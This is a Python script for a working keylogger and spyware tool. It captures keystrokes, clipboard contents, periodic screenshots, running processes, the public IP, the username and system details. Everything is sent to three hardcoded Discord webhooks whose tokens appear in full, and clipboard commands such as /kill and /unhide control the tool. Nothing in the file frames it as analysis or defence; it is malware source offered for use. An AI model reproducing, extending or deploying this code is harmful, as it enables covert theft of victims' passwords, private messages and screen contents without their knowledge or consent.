import os
import requests
import threading
import subprocess
import time
from pynput import keyboard
import psutil
import pyperclip
import pyautogui
import io
from datetime import datetime

# Discord webhook URL (replace with your own webhook URL)
WEBHOOK_URL = 'https://discord.com/api/webhooks/1349444290685964400/oxR58MZVbLbFAgplbUV20kDIJCLogOawEksaOU7iHRlkLX0cX4XKAM28NO_sHgD2LYxO'

# Store the keystrokes
keystrokes = ""
lock = threading.Lock()
last_keypress_time = time.time()
last_clipboard = ""
pyperclip.copy("")

# Dictionary for special keys
special_keys = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: " [ENTER] ",
    keyboard.Key.backspace: " <- ",
    keyboard.Key.tab: " [TAB] ",
    keyboard.Key.shift: " [SHIFT] ",
    keyboard.Key.ctrl_l: " [CTRL] ",
    keyboard.Key.alt_l: " [ALT] ",
    keyboard.Key.cmd: " [CMD] ",
    keyboard.Key.esc: " [ESC] ",
}

username = os.getlogin()


def run_bat_file():
    """Run the kill.bat file when the script starts."""
    bat_file_path = rf"C:\users\{username}\kl2.1\kill.bat"  # Update the path to your kill.bat file
    try:
        subprocess.run([bat_file_path], check=True)
        print(f"Successfully ran {bat_file_path}")
    except subprocess.CalledProcessError as e:
        print(f"Error running {bat_file_path}: {e}")

def unhide():
    """Run the kill.bat file when the script starts."""
    bat_file_path = rf"C:\users\{username}\kl2.1\unhide.bat"  # Update the path to your kill.bat file
    try:
        subprocess.run([bat_file_path], check=True)
        print(f"Successfully ran {bat_file_path}")
    except subprocess.CalledProcessError as e:
        print(f"Error running {bat_file_path}: {e}")


def get_public_ip():
    """Fetch the public IP address using an external API."""
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return response.json().get("ip")
        else:
            return "Unknown"
    except Exception as e:
        print(f"Error getting public IP address: {e}")
        return "Unknown"


def send_to_webhook(message):
    """Send the message to the Discord webhook."""
    payload = {"content": message}
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200:
            print("Webhook message sent successfully.")
        else:
            print(f"Failed to send webhook message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message to webhook: {e}")
        
def send_to_webhook_processes(message):
    """Send the message to the Discord webhook."""
    payload = {"content": message}
    try:
        response = requests.post(WEBHOOK_URL_PROCESSES, json=payload)
        if response.status_code == 200:
            print("Webhook message sent successfully.")
        else:
            print(f"Failed to send webhook message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message to webhook: {e}")


def keystroke_monitor():
    """Monitor keystrokes and send them after 3 seconds of inactivity."""
    global keystrokes, last_keypress_time
    while True:
        time.sleep(1)
        with lock:
            if keystrokes and time.time() - last_keypress_time > 3:
                send_to_webhook(keystrokes)
                keystrokes = ""


def on_press(key):
    global keystrokes, last_keypress_time
    try:
        key_str = key.char
    except AttributeError:
        key_str = special_keys.get(key, f"[{key}]")

    with lock:
        keystrokes += key_str
        last_keypress_time = time.time()


def on_release(key):
    global last_clipboard
    try:
        # Check if clipboard has changed
        current_clipboard = pyperclip.paste()

        # If clipboard content has changed, send it to the webhook
        if current_clipboard != last_clipboard:
            last_clipboard = current_clipboard
            send_to_webhook(f"{username} just copied something to clipboard!")
            send_to_webhook(f"Clipboard content: {current_clipboard}")

        # Handle the /kill or /remove clipboard commands
        if "/kill" in current_clipboard:
            send_to_webhook(f"Kill command executed by: {username}")
            send_to_webhook("Launching again on restart.")
            return False

        elif "/processes" in current_clipboard:
            try:
                process_thread.start()
            except:
                send_to_webhook("Error finding processes.")

        elif "/unhide" in current_clipboard:
            try:
                unhide()
                send_to_webhook("Folder visable process stopped.")
            except:
                send_to_webhook("Faild to make folder visable.")
            return False

    except Exception as e:
        print(f"Error accessing clipboard: {e}")

    return True


def monitor_clipboard():
    """Monitor the clipboard for changes and send the content to the webhook."""
    global last_clipboard
    while True:
        time.sleep(1)
        try:
            current_clipboard = pyperclip.paste()

            # If clipboard content has changed, send it to the webhook
            if current_clipboard != last_clipboard:
                last_clipboard = current_clipboard
                send_to_webhook(f"{username} just copied something to clipboard!")
                send_to_webhook(f"Clipboard content: {current_clipboard}")

        except Exception as e:
            print(f"Error accessing clipboard: {e}")

WEBHOOK_URL_PROCESSES = "https://discord.com/api/webhooks/1349769172862898206/9EPIPwHXe2X8tzDu_alb6h8nZc0ZISh14b7TMuSTLo3qmHOSu2K3cOVMoKLTkXnH1YLR"
def monitor_processes():
    running_processes = set()

    while True:
        current_processes = set(p.name() for p in psutil.process_iter())
        new_processes = current_processes - running_processes
        closed_processes = running_processes - current_processes

        for proc in new_processes:
            message = f"Started: {proc}"
            send_to_webhook_processes(message)

        for proc in closed_processes:
            message = f"Closed: {proc}"
            send_to_webhook_processes(message)

        running_processes = current_processes
        time.sleep(1)  # Check every 2 seconds after the first check

WEBHOOK_URL_SCREENSHOTS = "https://discord.com/api/webhooks/1349762273824215180/8im_PuVb4CrUGktRt_ywF1JvIC_eRS1XJgLdnI7HKHaMcsEOtNcB3605q0ilDuUvo2GX"
def send_to_webhook_pic(filename):
    """Send the screenshot to the Discord webhook."""
    with open(filename, "rb") as file:
        payload = {"content": "New Screenshot!"}
        files = {"file": file}

        try:
            response = requests.post(WEBHOOK_URL_SCREENSHOTS, data=payload, files=files)
            if response.status_code == 200 or response.status_code == 204:
                print("Webhook message sent successfully.")
            else:
                print(f"Failed to send webhook message. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending message to webhook: {e}")


def screenshot():
    while True:
        try:
            print("Taking screenshot...")
            now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"screen_{now}.png"

            screenshotpng = pyautogui.screenshot()
            screenshotpng.save(filename)

            print(f"Screenshot saved as {filename}")

            send_to_webhook_pic(filename)
            time.sleep(1)  # Warten, bevor die Datei gelöscht wird

            os.remove(filename)
            print(f"Deleted {filename}")

        except Exception as e:
            print(f"Error in screenshot function: {e}")

        time.sleep(5)  # Wartezeit vor dem nächsten Screenshot


# Run kill.bat file at the start
run_bat_file()

# Get and send public IP and username
username = os.getlogin()
public_ip = get_public_ip()
send_to_webhook(f"Connection established. Public IP address: {public_ip}")
send_to_webhook(f"Current user: {username}")

# Gather system information
cpu_count = psutil.cpu_count(logical=True)
cpu_percent = psutil.cpu_percent(interval=1)
memory_info = psutil.virtual_memory()
disk_info = psutil.disk_usage('/')

send_to_webhook(f"CPU cores: {cpu_count}")
send_to_webhook(f"CPU percent: {cpu_percent}%")
send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
send_to_webhook("Commands: /kill /unhide /processes(VERY LAGGY!)")

# Start all monitoring threads
keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
screenshot_thread = threading.Thread(target=screenshot, daemon=True)
process_thread = threading.Thread(target=monitor_processes, daemon=True)

keystroke_thread.start()
clipboard_thread.start()
screenshot_thread.start()

# Set up the keyboard listener
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Listener stopped.")
